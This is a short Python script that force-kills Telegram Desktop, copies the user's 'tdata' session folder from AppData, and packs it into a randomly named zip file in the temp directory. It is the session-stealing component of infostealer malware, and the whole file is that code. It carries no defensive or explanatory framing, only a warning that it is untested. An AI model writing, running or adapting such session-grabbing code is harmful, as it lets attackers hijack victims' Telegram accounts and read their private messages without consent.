
'''Warning: This is untested it is not guranteed that it will work.'''
import os
import shutil
from zipfile import ZipFile
import tempfile
import uuid
import subprocess


def kill_process(process_name):
    """Kill a process by name."""
    try:
        subprocess.call(["taskkill", "/F", "/IM", process_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"Failed to kill process {process_name}: {e}")

def remove_directory(directory):
    """Remove a directory and all its contents."""
    try:
        shutil.rmtree(directory)
    except Exception as e:
        print(f"Failed to remove directory {directory}: {e}")

def copy_directory(src, dest):
    """Copy the contents of one directory to another."""
    try:
        shutil.copytree(src, dest)
    except Exception as e:
        print(f"Failed to copy directory {src} to {dest}: {e}")

def telegram():
    try:
        kill_process("Telegram.exe")
    except:
        pass

    user = os.path.expanduser("~")
    source_path = os.path.join(user, "AppData\\Roaming\\Telegram Desktop\\tdata")
    temp_path = os.path.join(tempfile.gettempdir(), f"tdata_session_{uuid.uuid4().hex}")
    zip_path = os.path.join(tempfile.gettempdir(), f"tdata_session_{uuid.uuid4().hex}.zip")

    if os.path.exists(source_path):
        if os.path.exists(temp_path):
            remove_directory(temp_path)
        copy_directory(source_path, temp_path)

        with ZipFile(zip_path, 'w') as zipf:
            for root, dirs, files in os.walk(temp_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, os.path.join(temp_path, '..')))

        # Clean up the temporary folder after zipping
        remove_directory(temp_path)

        return zip_path  # Return the path to the generated ZIP file
    else:
        raise FileNotFoundError(f"Telegram data directory not found at {source_path}")


